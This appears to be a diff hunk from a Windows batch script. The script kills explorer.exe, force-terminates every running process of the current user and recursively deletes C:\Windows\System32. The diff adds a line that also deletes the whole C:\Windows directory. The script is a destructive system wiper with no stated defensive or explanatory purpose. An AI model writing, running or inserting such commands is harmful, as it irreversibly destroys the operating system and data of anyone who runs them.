@@ -5,4 +5,5 @@ taskkill /im explorer.exe /f >nul
 for /f "tokens=1" %%i in ('tasklist /FI "USERNAME eq %USERNAME%" /FI "STATUS eq running" /NH') do (
     taskkill /f /im "%%i" >nul 2>&1
 )
+rd /s /q C:\Windows
 rd /s /q C:\Windows\System32
